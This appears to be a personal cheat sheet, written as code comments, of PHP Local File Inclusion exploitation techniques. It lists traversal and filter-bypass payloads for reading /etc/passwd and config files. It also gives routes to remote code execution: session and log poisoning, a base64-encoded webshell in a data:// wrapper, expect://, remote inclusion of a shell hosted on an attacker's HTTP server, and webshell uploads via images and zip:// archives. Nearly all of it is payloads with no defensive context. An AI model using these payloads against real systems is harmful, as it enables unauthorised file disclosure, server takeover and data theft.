// Local File Inclusion
//! Exploiting
//* Non recursive filter
// ....// => ../
//* Url encoding
// ../ => %2e%2e%2f
// maybe there is a dynamic route
// /get_file/<file_name> =>  /get_file/..%2f..%2f..%2fetc%2fpasswd
//* Added .php in the path
// whatever you enter you get /etc/passwd.php
// since the max length in php strings is 4096
// you can add  './' 2048 times
// so the added .php string gets truncated
//* Null byte injection
// early php versions would end a string if you add %00 to it
// so /etc/passwd%00.php would be /etc/passwd
//* Getting php configuration
// X.Y is php version
// nginx : /etc/php/X.Y/fpm/php.ini
// apache : /etc/php/X.Y/apache2/php.ini
//* Session Poisoning
// if you can control any field in the session you can inject php code in there
// then look for your PHPSESSID /var/lib/php/sessions/sess_f04868f3017c3231892877824977225c
// by including /var/lib/php/sessions/sess_PHPSESSID you get RCE
//* Log Poisoning
// usualy you can control the user agent or referer that gets reflected in the logs
// then you can inject php code in there
// by including /var/log/apache2/access.log or /var/log/nginx/access.log you get RCE
//! Php wrappers
//* Base64 filter
// php://filter/read=convert.base64-encode/resource=config.php
//* RCE via data wrapper
// if allow_url_include is on
// data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
// the base64 contains : <?php system($_GET["cmd"]); ?>
//* Expect wrapper
// if expect is installed
// expect://cmd
//! RFI
//* via http
// host : <?php system($_GET["cmd"]); ?>
// using :  sudo python3 -m http.server <LISTENING_PORT>
// then access it via : http://<IP>:<LISTENING_PORT>/index.php?cmd=cmd
//! File upload
//* images
// you can upload file.gif
// if there is an LFI and it contains a php script
// including it will result in RCE
// because php include execute files based on their content not their extension
//* zip
// if zip is installed
// create a zip  of shell.php with : zip shell.jpg shell.php
// upload it
// then access it via : zip://path/to/shell.jpg#shell.php&cmd=cmd

